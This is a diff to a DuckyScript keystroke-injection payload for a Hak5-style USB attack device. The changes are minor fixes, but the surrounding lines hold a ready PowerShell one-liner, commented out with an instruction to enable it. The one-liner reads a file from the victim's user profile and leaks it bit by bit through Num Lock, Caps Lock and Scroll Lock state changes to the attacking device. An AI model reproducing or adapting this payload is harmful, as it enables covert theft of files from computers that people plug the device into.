@@ -10,7 +10,7 @@ REM Config: You will need to change the path to an image at the moment it points
 REM Note: this will take forever a 807 bytes file took about 7 mins.
 
 ATTACKMODE HID
-LED OFF
+LED_OFF
 DELAY 2000
 SAVE_HOST_KEYBOARD_LOCK_STATE
 $_EXFIL_MODE_ENABLED = TRUE
@@ -26,7 +26,7 @@ REM STRINGLN powershell "gc $env:USERPROFILE\test.jpg -En By|%{$k+=([convert]::T
 
 REM This bit version it is slightly short then the example payload for hak5. 
 REM By replacing the all hex value that it uses to check each bit agaist each byte. 
-REM Too piping 7 down to 0 the left shifing 1 by this value i.e. 1 -shl 7 = (bin 10000000, hex 80 dec 128) to 1 -shl 0 = (bin 00000001, hex 1 dec 1)
+REM by piping 7 down to 0 then left shifing 1 by this value i.e. 1 -shl 7 = (bin 10000000, hex 80 dec 128) to 1 -shl 0 = (bin 00000001, hex 1 dec 1)
 REM UN-REM THE LINE BELOW TO USES
 REM STRINGLN powershell "gc $env:USERPROFILE\test.jpg -En By|%{$b=$_;7..0|%{if($b-band(1-shl$_)){$k+='%{NUMLOCK}'}else{$k+='%{CAPSLOCK}'}}};$k+='%{SCROLLLOCK}';Add-Type -A *m.W*s.F*s;[System.Windows.Forms.SendKeys]::SendWait($k)"
 
